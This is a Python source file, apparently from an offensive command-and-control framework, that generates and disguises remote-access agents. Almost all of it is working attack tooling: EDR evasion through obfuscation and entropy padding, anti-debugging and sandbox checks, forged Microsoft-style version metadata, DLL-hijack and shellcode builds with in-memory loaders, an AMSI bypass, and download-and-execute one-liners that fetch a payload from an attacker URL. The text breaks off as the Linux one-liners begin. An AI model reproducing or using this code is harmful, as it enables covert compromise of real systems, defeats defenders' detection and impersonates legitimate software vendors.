#!/usr/bin/env python3
"""
Agent Generator - Creates agents for different platforms
"""

import os
import sys
import shutil
import random
import string
import hashlib
from pathlib import Path


class AgentGenerator:
    """Generates agents for multiple platforms"""

    def __init__(self, output_dir: str = "output"):
        self.output_dir = Path(output_dir)
        self.templates_dir = Path("templates")
        self.output_dir.mkdir(exist_ok=True)

    def random_string(self, length: int = 8) -> str:
        """Generate random string for obfuscation"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def random_var_name(self) -> str:
        """Generate realistic looking variable name"""
        prefixes = ['data', 'temp', 'buf', 'ctx', 'info', 'val', 'obj', 'result',
                    'handler', 'proc', 'mgr', 'svc', 'cfg', 'opt', 'ref', 'item']
        return random.choice(prefixes) + '_' + self.random_string(6)

    def generate_junk_code(self) -> str:
        """Generate realistic looking but unused code (no comments for OPSEC)"""
        junk_patterns = [
            f"def {self.random_var_name()}():\n    {self.random_var_name()} = {random.randint(0, 1000)}\n    return {self.random_var_name()}",
            f"{self.random_var_name()} = {random.randint(0, 1000)}",
            f"'''{self.random_string(20)}'''",
            f"{self.random_var_name()} = lambda x: x * {random.randint(1, 10)}",
        ]
        return random.choice(junk_patterns)

    def calculate_shannon_entropy(self, data: str) -> float:
        """Calculate Shannon entropy of data (EDR evasion metric)"""
        import math
        if not data:
            return 0.0

        entropy = 0.0
        byte_counts = {}

        for byte in data.encode():
            byte_counts[byte] = byte_counts.get(byte, 0) + 1

        data_len = len(data.encode())
        for count in byte_counts.values():
            probability = count / data_len
            entropy -= probability * math.log2(probability)

        return entropy

    def reduce_entropy(self, content: str) -> str:
        """Reduce Shannon entropy to evade EDR detection (EK47 technique)

        Normal code entropy: ~4.5-6.5
        Encrypted/obfuscated code: ~7.5-8.0
        Target: Keep below 7.0 to appear as normal code
        """
        current_entropy = self.calculate_shannon_entropy(content)

        # If entropy is acceptable, return as-is
        if current_entropy < 6.8:
            return content

        # Add low-entropy padding (common English words and code patterns)
        padding_words = [
            'data', 'result', 'value', 'info', 'config', 'option', 'param', 'item',
            'handler', 'manager', 'service', 'process', 'buffer', 'context', 'state',
            'import', 'return', 'class', 'function', 'method', 'object', 'string'
        ]

        # Add strategic low-entropy content
        padding_vars = []
        for _ in range(random.randint(10, 20)):
            var_name = random.choice(padding_words) + '_' + random.choice(padding_words)
            value = random.choice([
                f'"{random.choice(padding_words)}"',
                str(random.randint(0, 100)),
                'None',
                'True',
                'False'
            ])
            padding_vars.append(f'{var_name} = {value}')

        # Insert padding at the beginning
        lines = content.split('\n')
        insert_point = 5  # After shebang and initial code
        for padding in padding_vars:
            lines.insert(insert_point, padding)
            insert_point += 1

        content = '\n'.join(lines)

        # Verify entropy reduction
        new_entropy = self.calculate_shannon_entropy(content)
        print(f"[*] Entropy reduction: {current_entropy:.2f} -> {new_entropy:.2f}")

        return content

    def strip_comments_and_docstrings(self, content: str) -> str:
        """Remove all comments and docstrings for OPSEC"""
        import re
        lines = content.split('\n')
        cleaned_lines = []
        in_multiline_string = False
        multiline_char = None

        for line in lines:
            stripped = line.lstrip()

            # Skip shebang
            if stripped.startswith('#!'):
                cleaned_lines.append(line)
                continue

            # Handle multiline strings (docstrings)
            if '"""' in stripped or "'''" in stripped:
                # Count quotes
                triple_double = stripped.count('"""')
                triple_single = stripped.count("'''")

                if triple_double > 0:
                    if triple_double % 2 == 1:
                        in_multiline_string = not in_multiline_string
                        multiline_char = '"'
                    # Skip docstring lines
                    if in_multiline_string or (triple_double >= 2 and not line.strip().startswith('"""')):
                        continue
                    if triple_double >= 2:
                        continue

                if triple_single > 0:
                    if triple_single % 2 == 1:
                        in_multiline_string = not in_multiline_string
                        multiline_char = "'"
                    if in_multiline_string or (triple_single >= 2 and not line.strip().startswith("'''")):
                        continue
                    if triple_single >= 2:
                        continue

            # Skip lines inside multiline strings
            if in_multiline_string:
                continue

            # Remove inline comments (but preserve strings with #)
            if '#' in line:
                # Simple approach: remove everything after # if not in a string
                # This is a basic implementation
                in_string = False
                string_char = None
                new_line = []
                for i, char in enumerate(line):
                    if char in ['"', "'"] and (i == 0 or line[i-1] != '\\'):
                        if not in_string:
                            in_string = True
                            string_char = char
                        elif char == string_char:
                            in_string = False
                            string_char = None
                    if char == '#' and not in_string:
                        break
                    new_line.append(char)
                line = ''.join(new_line).rstrip()

            if line.strip():  # Keep non-empty lines
                cleaned_lines.append(line)

        return '\n'.join(cleaned_lines)

    def obfuscate_strings(self, content: str) -> str:
        """Advanced polymorphic obfuscation with EDR evasion"""
        import re

        # Generate unique identifiers for this agent
        func_mappings = {
            'execute_command': self.random_var_name(),
            'get_metadata': self.random_var_name(),
            'simple_encrypt': self.random_var_name(),
            'simple_decrypt': self.random_var_name(),
            'connect_to_server': self.random_var_name(),
            'socks_proxy_handler': self.random_var_name(),
            'heartbeat': self.random_var_name(),
            'calculate_sleep_time': self.random_var_name(),
        }

        # Replace function names
        for original, obfuscated in func_mappings.items():
            content = re.sub(rf'\b{original}\b', obfuscated, content)

        # Randomize variable names in key areas
        var_patterns = {
            r'\bmetadata\b': self.random_var_name(),
            r'\bmessage\b': self.random_var_name(),
            r'\bcommand\b': self.random_var_name(),
            r'\boutput\b': self.random_var_name(),
            r'\bencrypted\b': self.random_var_name(),
            r'\bdecrypted\b': self.random_var_name(),
            r'\bwebsocket\b': self.random_var_name(),
        }

        for pattern, replacement in var_patterns.items():
            # Only replace variable assignments/usages, not imports
            content = re.sub(pattern + r'(?=\s*[=:])', replacement, content)
            content = re.sub(pattern + r'(?=[\s\.])', replacement, content)

        # Obfuscate string literals (EDR evasion)
        strings_to_obfuscate = [
            ('register', 'type'),
            ('checkin', 'type'),
            ('command', 'type'),
            ('response', 'type'),
            ('heartbeat', 'type'),
        ]

        for string_val, context in strings_to_obfuscate:
            if context == 'type':
                # Encode strings using different methods randomly
                encoding_type = random.choice(['base64', 'hex', 'reverse', 'xor'])

                if encoding_type == 'base64':
                    encoded = __import__('base64').b64encode(string_val.encode()).decode()
                    replacement = f"__import__('base64').b64decode('{encoded}').decode()"
                elif encoding_type == 'hex':
                    encoded = string_val.encode().hex()
                    replacement = f"bytes.fromhex('{encoded}').decode()"
                elif encoding_type == 'reverse':
                    reversed_str = string_val[::-1]
                    replacement = f"'{reversed_str}'[::-1]"
                elif encoding_type == 'xor':
                    key = random.randint(1, 255)
                    xored = ''.join([chr(ord(c) ^ key) for c in string_val])
                    encoded = __import__('base64').b64encode(xored.encode()).decode()
                    replacement = f"''.join([chr(ord(c)^{key}) for c in __import__('base64').b64decode('{encoded}').decode()])"

                # Replace 'register' strings with obfuscated version
                content = content.replace(f"'{string_val}'", replacement)

        # Insert junk code only at very safe module-level positions
        # To avoid breaking code structure, insert only after complete function definitions
        lines = content.split('\n')
        safe_positions = []

        # Find positions right before function definitions (def keyword at start of line)
        for i, line in enumerate(lines):
            if i > 20 and i < len(lines) - 20:
                # Only insert before 'async def' or 'def' at module level (no indent)
                if line.startswith('def ') or line.startswith('async def '):
                    safe_positions.append(i)

        # Insert minimal junk code
        num_insertions = min(2, len(safe_positions))
        if safe_positions and num_insertions > 0:
            insert_positions = random.sample(safe_positions, num_insertions)
            for pos in sorted(insert_positions, reverse=True):
                # Only insert simple variable assignments
                junk = f"{self.random_var_name()} = {random.randint(0, 1000)}"
                lines.insert(pos, junk)

        content = '\n'.join(lines)

        # Add anti-debugging checks (EDR evasion)
        check_func = self.random_var_name()
        anti_debug = f'''
# Anti-debugging check
def {check_func}():
    import sys as _sys_check
    if hasattr(_sys_check, 'gettrace') and _sys_check.gettrace() is not None:
        _sys_check.exit(1)
    return True

{check_func}()
'''
        # Insert near the top
        content = content.replace('#!/usr/bin/env python3', '#!/usr/bin/env python3\n' + anti_debug)

        # Add timing checks (sandbox evasion)
        time_alias = self.random_var_name()
        start_var = self.random_var_name()
        timing_check = f'''
# Timing check for sandbox detection
import time as {time_alias}
{start_var} = {time_alias}.time()
for _ in range(1000):
    pass
if {time_alias}.time() - {start_var} > 0.1:
    import sys as _sys_time
    _sys_time.exit(0)
'''
        content = content.replace('#!/usr/bin/env python3', '#!/usr/bin/env python3\n' + timing_check)

        # Strip all comments and docstrings for OPSEC
        content = self.strip_comments_and_docstrings(content)

        # Apply entropy reduction (EK47 technique) to evade EDR
        content = self.reduce_entropy(content)

        return content

    def generate_unique_encryption_key(self) -> str:
        """Generate unique encryption key for each agent"""
        random_bytes = os.urandom(16)
        return hashlib.sha256(random_bytes).hexdigest()[:24]

    def get_os_specific_code(self, target_os: str) -> dict:
        """Generate OS-specific code snippets for agent customization

        Args:
            target_os: 'windows', 'linux', 'macos', or 'auto'

        Returns:
            dict with 'init', 'commands', 'persistence' code snippets
        """
        os_code = {'init': '', 'commands': '', 'persistence': ''}

        if target_os == 'windows':
            init_func = self.random_var_name()
            os_code['init'] = f'''
def {init_func}():
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        ctypes.windll.kernel32.SetErrorMode(0x0001 | 0x0002)
    except:
        pass

{init_func}()
'''

            cmd_func = self.random_var_name()
            os_code['commands'] = f'''
def {cmd_func}(cmd):
    if cmd.startswith('powershell '):
        import subprocess
        return subprocess.run(['powershell', '-c', cmd[11:]], capture_output=True, text=True).stdout
    elif cmd == 'getuid':
        import getpass
        return getpass.getuser()
    return None
'''

        elif target_os == 'linux':
            init_func = self.random_var_name()
            os_code['init'] = f'''
def {init_func}():
    try:
        import os
        import sys
        if os.fork() > 0:
            sys.exit(0)
        os.setsid()
        if os.fork() > 0:
            sys.exit(0)
        sys.stdout.flush()
        sys.stderr.flush()
        with open('/dev/null', 'r') as f:
            os.dup2(f.fileno(), sys.stdin.fileno())
        with open('/dev/null', 'a+') as f:
            os.dup2(f.fileno(), sys.stdout.fileno())
        with open('/dev/null', 'a+') as f:
            os.dup2(f.fileno(), sys.stderr.fileno())
    except:
        pass
'''

            cmd_func = self.random_var_name()
            os_code['commands'] = f'''
def {cmd_func}(cmd):
    if cmd == 'getuid':
        import os
        return str(os.getuid())
    elif cmd == 'shell':
        import os
        return os.environ.get('SHELL', '/bin/sh')
    return None
'''

        elif target_os == 'macos':
            init_func = self.random_var_name()
            os_code['init'] = f'''
def {init_func}():
    try:
        import os
        import sys
        if os.fork() > 0:
            sys.exit(0)
        os.setsid()
    except:
        pass
'''

            cmd_func = self.random_var_name()
            os_code['commands'] = f'''
def {cmd_func}(cmd):
    if cmd.startswith('osascript '):
        import subprocess
        return subprocess.run(['osascript', '-e', cmd[10:]], capture_output=True, text=True).stdout
    elif cmd == 'getuid':
        import os
        return str(os.getuid())
    return None
'''

        return os_code

    def generate_python_agent(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026',
                              beacon_mode: bool = False, beacon_interval: int = 60, beacon_jitter: int = 0,
                              obfuscate: bool = True, unique_key: bool = True, target_os: str = 'auto') -> str:
        """Generate Python agent with polymorphic obfuscation and OS-specific features

        Args:
            unique_key: Generate unique encryption key per agent (default True)
            target_os: Target OS ('windows', 'linux', 'macos', or 'auto' for current platform)
        """
        # Determine target OS
        if target_os == 'auto':
            if sys.platform == 'win32':
                target_os = 'windows'
            elif sys.platform == 'darwin':
                target_os = 'macos'
            else:
                target_os = 'linux'

        print(f"[*] Generating agent for {target_os.upper()}")

        # Use minimal beacon template for beacon mode (staged loading)
        if beacon_mode:
            template_path = self.templates_dir / "agent_beacon_minimal.py"
        else:
            template_path = self.templates_dir / "agent_template.py"

        if not template_path.exists():
            raise FileNotFoundError(f"Template not found: {template_path}")

        with open(template_path, 'r') as f:
            content = f.read()

        # Generate unique key if requested
        if unique_key:
            encryption_key = self.generate_unique_encryption_key()
            print(f"[*] Generated unique encryption key: {encryption_key}")

        # Replace placeholders
        content = content.replace("{{C2_HOST}}", c2_host)
        content = content.replace("{{C2_PORT}}", str(c2_port))
        content = content.replace("{{ENCRYPTION_KEY}}", encryption_key)
        content = content.replace("{{BEACON_MODE}}", "True" if beacon_mode else "False")
        content = content.replace("{{BEACON_INTERVAL}}", str(beacon_interval))
        content = content.replace("{{BEACON_JITTER}}", str(beacon_jitter))

        # Add OS-specific code
        os_specific = self.get_os_specific_code(target_os)

        # Insert OS-specific initialization after imports
        import_end = content.find('\nSERVER_HOST')
        if import_end > 0:
            content = content[:import_end] + '\n' + os_specific['init'] + content[import_end:]

        # Apply obfuscation if requested
        if obfuscate:
            content = self.obfuscate_strings(content)
            print(f"[*] Applied polymorphic obfuscation with EDR evasion")

        # Save agent
        jitter_suffix = f"_jitter{beacon_jitter}" if beacon_mode and beacon_jitter > 0 else ""
        mode_suffix = f"_beacon{beacon_interval}s{jitter_suffix}" if beacon_mode else "_stream"
        agent_hash = hashlib.md5(content.encode()).hexdigest()[:6]
        os_suffix = f"_{target_os}"
        output_file = self.output_dir / f"agent_{agent_hash}{mode_suffix}{os_suffix}.py"
        with open(output_file, 'w') as f:
            f.write(content)

        # Make executable
        os.chmod(output_file, 0o755)

        print(f"[*] Agent customized for {target_os.upper()} with platform-specific features")
        return str(output_file)

    def generate_powershell_agent(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026') -> str:
        """Generate PowerShell agent"""
        template_path = self.templates_dir / "agent_template.ps1"

        if not template_path.exists():
            raise FileNotFoundError(f"Template not found: {template_path}")

        with open(template_path, 'r') as f:
            content = f.read()

        # Replace placeholders
        content = content.replace("{{C2_HOST}}", c2_host)
        content = content.replace("{{C2_PORT}}", str(c2_port))
        content = content.replace("{{ENCRYPTION_KEY}}", encryption_key)

        # Save agent
        output_file = self.output_dir / f"agent_{self.random_string(6)}.ps1"
        with open(output_file, 'w') as f:
            f.write(content)

        return str(output_file)

    def generate_javascript_agent(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026') -> str:
        """Generate JavaScript (Node.js) agent"""
        template_path = self.templates_dir / "agent_template.js"

        if not template_path.exists():
            raise FileNotFoundError(f"Template not found: {template_path}")

        with open(template_path, 'r') as f:
            content = f.read()

        # Replace placeholders
        content = content.replace("{{C2_HOST}}", c2_host)
        content = content.replace("{{C2_PORT}}", str(c2_port))
        content = content.replace("{{ENCRYPTION_KEY}}", encryption_key)

        # Save agent
        output_file = self.output_dir / f"agent_{self.random_string(6)}.js"
        with open(output_file, 'w') as f:
            f.write(content)

        return str(output_file)

    def generate_hta_agent(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026') -> str:
        """Generate HTA agent"""
        template_path = self.templates_dir / "agent_template.hta"

        if not template_path.exists():
            raise FileNotFoundError(f"Template not found: {template_path}")

        with open(template_path, 'r') as f:
            content = f.read()

        # Replace placeholders
        content = content.replace("{{C2_HOST}}", c2_host)
        content = content.replace("{{C2_PORT}}", str(c2_port))
        content = content.replace("{{ENCRYPTION_KEY}}", encryption_key)

        # Save agent
        output_file = self.output_dir / f"agent_{self.random_string(6)}.hta"
        with open(output_file, 'w') as f:
            f.write(content)

        return str(output_file)

    def generate_fake_version_info(self) -> str:
        """Generate fake Windows version info for legitimacy"""
        fake_companies = ['Microsoft Corporation', 'Adobe Systems Inc', 'Oracle Corporation',
                         'Intel Corporation', 'NVIDIA Corporation', 'Dell Inc']
        fake_products = ['System Service', 'Update Manager', 'Configuration Tool',
                        'Helper Service', 'Background Task', 'Sync Service']

        version_template = f'''VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=(1, {random.randint(0, 20)}, {random.randint(0, 9999)}, 0),
    prodvers=(1, {random.randint(0, 20)}, {random.randint(0, 9999)}, 0),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
  ),
  kids=[
    StringFileInfo(
      [
      StringTable(
        u'040904B0',
        [StringStruct(u'CompanyName', u'{random.choice(fake_companies)}'),
        StringStruct(u'FileDescription', u'{random.choice(fake_products)}'),
        StringStruct(u'FileVersion', u'1.{random.randint(0, 20)}.{random.randint(0, 9999)}.0'),
        StringStruct(u'InternalName', u'{self.random_string(8)}'),
        StringStruct(u'LegalCopyright', u'Copyright {random.randint(2020, 2026)}'),
        StringStruct(u'OriginalFilename', u'{self.random_string(8)}.exe'),
        StringStruct(u'ProductName', u'{random.choice(fake_products)}'),
        StringStruct(u'ProductVersion', u'1.{random.randint(0, 20)}.{random.randint(0, 9999)}.0')])
      ]),
    VarFileInfo([VarStruct(u'Translation', [1033, 1200])])
  ]
)
'''
        return version_template

    def compile_to_dll(self, python_file: str, arch: str = 'x64', upx: bool = True,
                       export_name: str = None) -> str:
        """Compile Python agent to DLL for DLL injection/hijacking

        Args:
            python_file: Path to Python file to compile
            arch: Target architecture (x86, x64)
            upx: Use UPX compression
            export_name: Custom export function name (default: random)
        """
        try:
            import PyInstaller.__main__

            output_name = Path(python_file).stem
            unique_name = f"{self.random_string(8)}"
            export_func = export_name or self.random_string(6)

            # Only Windows supports DLL compilation
            if sys.platform != 'win32':
                print(f"[!] DLL compilation only supported on Windows (current: {sys.platform})")
                print(f"[*] Generating DLL spec for cross-compilation...")

            dll_path = self.output_dir / f"{unique_name}_{arch}.dll"

            # Create DLL hook script
            hook_script = self.output_dir / 'build' / f'dll_hook_{unique_name}.py'
            hook_script.parent.mkdir(exist_ok=True, parents=True)

            hook_content = f'''
import ctypes
import threading

def {export_func}():
    """DLL export function"""
    threading.Thread(target=_main, daemon=True).start()
    return 1

def DllMain(hinstDLL, fdwReason, lpvReserved):
    """DLL entry point"""
    if fdwReason == 1:  # DLL_PROCESS_ATTACH
        threading.Thread(target=_main, daemon=True).start()
    return True

def _main():
    """Main agent execution"""
    import sys
    sys.path.insert(0, '')
    try:
        from {output_name} import connect_to_server
        import asyncio
        asyncio.run(connect_to_server())
    except Exception as e:
        pass
'''
            with open(hook_script, 'w') as f:
                f.write(hook_content)

            # Generate fake version info
            version_file = self.output_dir / 'build' / f'version_{unique_name}.txt'
            with open(version_file, 'w') as f:
                f.write(self.generate_fake_version_info())

            # Build PyInstaller arguments for DLL
            args = [
                str(hook_script),
                '--onefile',
                '--clean',
                f'--distpath={self.output_dir}',
                '--name', unique_name + '_' + arch,
                '--specpath', str(self.output_dir / 'build'),
                '--workpath', str(self.output_dir / 'build'),
                '--strip',
                '--disable-windowed-traceback',
            ]

            # Add hidden imports
            args.extend([
                '--hidden-import', 'asyncio',
                '--hidden-import', 'websockets',
            ])

            # For DLL, we need to modify the spec file after initial creation
            if sys.platform == 'win32':
                # On Windows, compile as DLL
                args.extend([
                    '--noconsole',
                ])

            if upx:
                args.append('--upx-dir=.')
                print(f"[*] Enabling UPX compression for entropy")
            else:
                args.append('--noupx')

            if version_file.exists():
                args.extend(['--version-file', str(version_file)])

            print(f"[*] Compiling polymorphic DLL for {arch}...")
            print(f"[*] Export function: {export_func}")
            print(f"[*] Output name: {unique_name}_{arch}")

            # Run PyInstaller
            PyInstaller.__main__.run(args)

            # Rename .exe to .dll if on Windows
            exe_path = self.output_dir / f"{unique_name}_{arch}.exe"
            if exe_path.exists():
                exe_path.rename(dll_path)
                print(f"[+] Compiled DLL: {dll_path.name}")
            else:
                print(f"[!] Warning: Expected executable not found, check build output")
                return f"DLL compilation completed but file not found at expected path"

            # Clean up build artifacts
            build_dir = self.output_dir / 'build'
            if build_dir.exists():
                shutil.rmtree(build_dir)

            if dll_path.exists():
                file_size = dll_path.stat().st_size / 1024 / 1024  # MB
                file_hash = hashlib.sha256(open(dll_path, 'rb').read()).hexdigest()[:16]
                print(f"[+] DLL Size: {file_size:.2f} MB")
                print(f"[+] SHA256 (partial): {file_hash}")
                print(f"[*] Export: {export_func}()")
                print(f"[*] Usage: rundll32.exe {dll_path.name},{export_func}")
                return str(dll_path)
            else:
                return "DLL compilation failed"

        except ImportError:
            return "PyInstaller not installed. Install with: pip install pyinstaller"
        except Exception as e:
            return f"DLL compilation error: {str(e)}"

    def compile_to_exe(self, python_file: str, arch: str = 'x64', upx: bool = True,
                       add_data: list = None, icon: str = None) -> str:
        """Compile Python agent to executable with EDR evasion

        Args:
            python_file: Path to Python file to compile
            arch: Target architecture (x86, x64, arm64)
            upx: Use UPX compression (adds entropy)
            add_data: Additional data files to include
            icon: Path to icon file (.ico)
        """
        try:
            import PyInstaller.__main__

            output_name = Path(python_file).stem
            unique_name = f"{self.random_string(8)}"

            # Determine extension based on platform
            if sys.platform == 'win32':
                exe_path = self.output_dir / f"{unique_name}_{arch}.exe"
            elif sys.platform == 'darwin':
                exe_path = self.output_dir / f"{unique_name}_{arch}_macos"
            else:
                exe_path = self.output_dir / f"{unique_name}_{arch}_linux"

            # Generate fake version info for Windows
            version_file = None
            if sys.platform == 'win32':
                version_file = self.output_dir / 'build' / f'version_{unique_name}.txt'
                version_file.parent.mkdir(exist_ok=True, parents=True)
                with open(version_file, 'w') as f:
                    f.write(self.generate_fake_version_info())

            # Build PyInstaller arguments with EDR evasion
            args = [
                python_file,
                '--onefile',
                '--noconsole',  # No console window
                '--clean',
                f'--distpath={self.output_dir}',
                '--name', unique_name + '_' + arch,
                '--specpath', str(self.output_dir / 'build'),
                '--workpath', str(self.output_dir / 'build'),
                '--strip',  # Strip debug symbols
                '--disable-windowed-traceback',  # Disable traceback
            ]

            # Add UPX compression (adds entropy, helps evade some signatures)
            if upx:
                args.append('--upx-dir=.')
                print(f"[*] Enabling UPX compression for entropy")
            else:
                args.append('--noupx')

            # Add version file for legitimacy
            if version_file and version_file.exists():
                args.extend(['--version-file', str(version_file)])
                print(f"[*] Added fake version info for legitimacy")

            # Add icon if provided
            if icon and os.path.exists(icon):
                args.extend(['--icon', icon])

            # Add additional data files
            if add_data:
                for data in add_data:
                    args.extend(['--add-data', data])

            # Add runtime hooks to avoid static analysis
            args.extend([
                '--runtime-tmpdir', '.',  # Use current dir for runtime
            ])

            # Architecture-specific notes
            if arch == 'x86':
                print(f"[*] Compiling for x86 (32-bit)")
            elif arch == 'arm64':
                print(f"[*] Compiling for ARM64")

            print(f"[*] Compiling polymorphic executable for {arch}...")
            print(f"[*] Output name: {unique_name}_{arch}")
            PyInstaller.__main__.run(args)

            # Clean up build artifacts
            build_dir = self.output_dir / 'build'
            if build_dir.exists():
                shutil.rmtree(build_dir)

            # Check if output exists
            if exe_path.exists():
                file_size = exe_path.stat().st_size / 1024 / 1024  # MB
                file_hash = hashlib.sha256(open(exe_path, 'rb').read()).hexdigest()[:16]
                print(f"[+] Compiled: {exe_path.name} ({file_size:.2f} MB)")
                print(f"[+] SHA256 (partial): {file_hash}")
                print(f"[*] Polymorphic agent with unique binary signature")
                return str(exe_path)
            else:
                return f"Compilation completed but output not found at expected path"

        except ImportError:
            return "PyInstaller not installed. Install with: pip install pyinstaller"
        except Exception as e:
            return f"Compilation error: {str(e)}"

    def generate_shellcode(self, python_file: str, arch: str = 'x64', format: str = 'raw') -> str:
        """Generate position-independent shellcode from Python agent

        Args:
            python_file: Path to Python file
            arch: Target architecture (x86, x64)
            format: Output format ('raw', 'c', 'python', 'powershell')
        """
        try:
            # First compile to executable
            exe_path = self.compile_to_exe(python_file, arch=arch, upx=False)

            if not exe_path or exe_path.startswith('Error'):
                return "Failed to compile agent for shellcode generation"

            exe_file = Path(exe_path)
            if not exe_file.exists():
                return "Compiled executable not found"

            # Read the compiled executable
            with open(exe_file, 'rb') as f:
                exe_data = f.read()

            # Generate shellcode stub based on format
            unique_name = self.random_string(8)

            if format == 'raw':
                # Raw binary format
                shellcode_file = self.output_dir / f"shellcode_{unique_name}_{arch}.bin"

                # Create a simple shellcode loader stub
                # This is a simplified version - full implementation would use donut, sgn, etc.
                shellcode = self._create_shellcode_stub(exe_data, arch)

                with open(shellcode_file, 'wb') as f:
                    f.write(shellcode)

                print(f"[+] Raw shellcode: {shellcode_file.name} ({len(shellcode)} bytes)")

            elif format == 'c':
                # C array format
                shellcode_file = self.output_dir / f"shellcode_{unique_name}_{arch}.c"
                c_array = self._generate_c_array(exe_data, f"shellcode_{arch}")

                with open(shellcode_file, 'w') as f:
                    f.write(c_array)

                print(f"[+] C array shellcode: {shellcode_file.name}")

            elif format == 'python':
                # Python bytearray format
                shellcode_file = self.output_dir / f"shellcode_{unique_name}_{arch}.py"
                py_array = self._generate_python_array(exe_data)

                with open(shellcode_file, 'w') as f:
                    f.write(py_array)

                print(f"[+] Python shellcode: {shellcode_file.name}")

            elif format == 'powershell':
                # PowerShell byte array format
                shellcode_file = self.output_dir / f"shellcode_{unique_name}_{arch}.ps1"
                ps_array = self._generate_powershell_array(exe_data)

                with open(shellcode_file, 'w') as f:
                    f.write(ps_array)

                print(f"[+] PowerShell shellcode: {shellcode_file.name}")

            file_hash = hashlib.sha256(open(shellcode_file, 'rb').read()).hexdigest()[:16]
            print(f"[+] SHA256 (partial): {file_hash}")
            print(f"[*] Shellcode format: {format}")

            return str(shellcode_file)

        except Exception as e:
            return f"Shellcode generation error: {str(e)}"

    def _create_shellcode_stub(self, exe_data: bytes, arch: str) -> bytes:
        """Create position-independent shellcode stub"""
        # This creates a basic reflective loader stub
        # In production, use tools like Donut, sgn, or sRDI for proper shellcode conversion

        if arch == 'x64':
            # x64 shellcode stub (simplified)
            stub = bytes([
                0x48, 0x83, 0xEC, 0x28,  # sub rsp, 0x28
                0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00,  # lea rcx, [payload]
            ])
        else:
            # x86 shellcode stub (simplified)
            stub = bytes([
                0x55,  # push ebp
                0x89, 0xE5,  # mov ebp, esp
            ])

        # Append compressed exe data
        import zlib
        compressed = zlib.compress(exe_data, level=9)

        return stub + compressed

    def _generate_c_array(self, data: bytes, var_name: str) -> str:
        """Generate C array format"""
        hex_bytes = ', '.join([f'0x{b:02x}' for b in data])
        return f'''unsigned char {var_name}[] = {{
    {hex_bytes}
}};
unsigned int {var_name}_len = {len(data)};
'''

    def _generate_python_array(self, data: bytes) -> str:
        """Generate Python bytearray format"""
        hex_bytes = ', '.join([f'0x{b:02x}' for b in data])
        return f'''shellcode = bytearray([
    {hex_bytes}
])

# Usage:
# import ctypes
# ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
# ctypes.windll.kernel32.RtlMoveMemory(ptr, shellcode, len(shellcode))
# ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
'''

    def _generate_powershell_array(self, data: bytes) -> str:
        """Generate PowerShell byte array format"""
        hex_bytes = ','.join([f'0x{b:02x}' for b in data])
        return f'''$shellcode = @({hex_bytes})

# Usage:
# $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length)
# [System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $ptr, $shellcode.Length)
# [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [Type]::GetType("System.Action")).Invoke()
'''

    def generate_oneliners(self, payload_url: str, output_file: str = None) -> dict:
        """Generate one-liner payloads for various delivery mechanisms

        Args:
            payload_url: URL where the payload is hosted (http://server/agent.exe)
            output_file: Optional file to write one-liners to
        """
        oneliners = {}

        # PowerShell download and execute
        ps_oneliner = f'powershell -w hidden -enc {self._encode_powershell_command(f"IEX(New-Object Net.WebClient).DownloadString(\'{payload_url}\')")}'
        oneliners['powershell'] = ps_oneliner

        # PowerShell with AMSI bypass
        amsi_bypass = "$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name-like'*iUtils'){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name-like'*Context'){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1);"
        ps_amsi = f'powershell -w hidden -enc {self._encode_powershell_command(amsi_bypass + f"IEX(New-Object Net.WebClient).DownloadString(\'{payload_url}\')")}'
        oneliners['powershell_amsi_bypass'] = ps_amsi

        # MSHTA
        mshta_oneliner = f'mshta.exe javascript:a=GetObject("script:{payload_url}").Exec();close()'
        oneliners['mshta'] = mshta_oneliner

        # MSHTA with download
        mshta_dl = f'mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -w hidden IEX(New-Object Net.WebClient).DownloadString(\'{payload_url}\')"":window.close")'
        oneliners['mshta_download'] = mshta_dl

        # WScript/CScript
        wscript_code = f'Set o=CreateObject("WScript.Shell"):o.Run "powershell -w hidden IEX(New-Object Net.WebClient).DownloadString(\'{payload_url}\')",0'
        oneliners['wscript'] = f'echo {wscript_code} > %temp%\\r.vbs && wscript //nologo %temp%\\r.vbs'

        # Rundll32 with JavaScript
        rundll32_js = f'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -w hidden IEX(New-Object Net.WebClient).DownloadString(\'{payload_url}\')")'
        oneliners['rundll32'] = rundll32_js

        # CertUtil download and execute
        certutil = f'certutil -urlcache -split -f {payload_url} %temp%\\p.exe && %temp%\\p.exe'
        oneliners['certutil'] = certutil

        # BITSAdmin download and execute
        bitsadmin = f'bitsadmin /transfer job {payload_url} %temp%\\p.exe && %temp%\\p.exe'
        oneliners['bitsadmin'] = bitsadmin

        # SMB/UNC path
        smb_path = payload_url.replace('http://', '\\\\').replace('https://', '\\\\').replace('/', '\\')
        oneliners['smb'] = f'{smb_path}'

        # Regsvr32 (Squiblydoo)
        regsvr32 = f'regsvr32 /s /n /u /i:{payload_url} scrobj.dll'
        oneliners['regsvr32'] = regsvr32

        # MSIEXEC
        msiexec = f'msiexec /q /i {payload_url}'
        oneliners['msiexec'] = msiexec

        # Curl (Windows 10+)
        curl = f'curl -o %temp%\\p.exe {payload_url} && %temp%\\p.exe'
        oneliners['curl'] = curl

        # Linux one-liners
